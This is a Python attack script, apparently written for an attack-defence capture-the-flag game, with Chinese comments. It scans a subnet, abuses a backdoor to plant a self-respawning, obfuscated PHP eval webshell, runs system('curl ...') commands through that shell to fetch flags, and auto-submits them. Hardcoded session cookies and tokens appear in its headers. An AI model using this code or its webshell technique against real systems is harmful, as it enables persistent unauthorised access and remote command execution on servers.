import requests
import threading
submitip='https://192.168.87.10/match/WAR17/entry'#提交flag的靶机的地址
header = {'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.125 Safari/537.36','Connection':'close'}
header2={#靶机的header
"Accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
"Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
"Accept-Encoding": "gzip, deflate",
"Referer":"https://192.168.87.10/match/WAR10/",
"Connection":"close",
"Cookie": "PHPSESSID=2m4qshhf7md5vqkbgvpd1if8s7; php-console-server=5; adl=eyJpdiI6InozQXJQWFNQN0p4M21wdnFMc3dURXc9PSIsInZhbHVlIjoiWjhrcFFLcXRURDlYWjlJSEhpU0lyMVpscmZUdW9UYTR1aDd6WHE0cGFpUlN2YjdSWHFhTUpVMzREc0U5TXpqeklxXC8zeTJ3ZTA5ZHhqdGtBQVwvN2R6QT09IiwibWFjIjoiMThkYzA4Y2U1MGUxY2MxMjNlMmJmZTE4Yzc2YWJlMTRjM2VmNjcyMWEyNThiMDU1OTI2N2JlNTFmOTk1ZGMyYiJ9; matchToken_10=eyJpdiI6IldoS0lRVHdPTDR6b3FtZmtcL1dXOUtBPT0iLCJ2YWx1ZSI6IlVhTjlucWlLXC9MdmU3dlVLNm9PMFh5SmVEZVVNU0FRRDNUZko0dHBaR0VDOUxhT2tua21SUHQzdEN3d1lOakcySVpBYUdNcndLWFNBeTljSUh4WXNCd1NuSTFoWTEyemhQWXBrSW9hZldoOUFnVjlzUUNPbjY0Mms5UU9aUTltWSIsIm1hYyI6ImU2NmM0NTlmZWQ0NTQ1ZjY1ZDJmNjAwOWQ3MjgzYzBmMzllMTliMGFmYTU4MGUwNWFlODk1YTdjZjc2MTk2MTkifQ%3D%3D",
"Upgrade-Insecure-Requests":"1",
"Cache-Control":"max-age=0",
}

ip="10.50"
iplist=[]
ips=[]
def submitflag(url,header,flag):
    r=requests.post(url,headers=header,data=flag)
def Getip(ip):
    try:
        r=requests.get('http://'+ip,headers=header)
        if r.status_code==200:
            print("[+] "+ip+"存活")
            ips.append(ip)
    except Exception as e:
        pass
def getflag():
    for iip in ips:
        shellurl = "http://" + iip + "/core/admin/register.php"  # 后门存在的地方
        url = "http://" + iip + "/.config.php"  # 一句话木马路径
        data1 = {"drop": 'system("curl*****");'}  # 攻击命令和后门密码
        try:
            #shellurl="http://"+iip+"/core/admin/register.php"#后门存在的地方
            url="http://"+iip+"/.config.php?pass=drops2019"#一句话木马路径
            data = {"xxxxxx": 'file_put_contents(\'config1.php\',base64_decode(\'PD9waHAgCmlnbm9yZV91c2VyX2Fib3J0KHRydWUpOwpzZXRfdGltZV9saW1pdCgwKTsKdW5saW5rKF9fRklMRV9fKTsKJGZpbGUgPSAnLmNvbmZpZy5waHAnOwokY29kZSA9ICc8P3BocCBpZihtZDUoJF9HRVRbInBhc3MiXSk9PSIzMjRmZjdjYmQ2ODk5OGY1YzUwYjhmYTE4YTA5NmQ2MSIpeyRrPSJldiIuImFsIjsgQCRrKCR7Il9QTyIuIlNUIn0gWydkcm9wJ10pO30gPz4nOwp3aGlsZSAoMSl7CiAgICBmaWxlX3B1dF9jb250ZW50cygkZmlsZSwkY29kZSk7CiAgICB1c2xlZXAoNTAwMCk7Cn0KPz4=\'));'}#data为post的数据
            data1={"drop":'system("curl http://10.0.1.2?token=JRWWYBUC");'}#攻击命令和后门密码
            r=requests.post(shellurl,data=data,headers=header)
            r = requests.get("http://"+iip+"/config1.php", timeout=(1, 2))
        except Exception as e:
            pass
        r=requests.post(url,data=data1,headers=header)
        if(r.status_code==200):
          print(iip+"的flag为:"+r.text)
          flagdata = {
              "atn": "answers",
              "id": "29",
              "token": "GMNLJRmapPKjq7pAn8Gp_17",
              "flag": {r.text},
          }
          submitflag(submitip,header2,flagdata)
for i in range(0,255):
    #for j in range(0,255):
        isip=ip+'.'+str(i)+'.'+str(3)
        iplist.append(isip)

for j in iplist:
    threading.Thread(target=Getip,args=(j,)).start()
print(ips)
getflag()
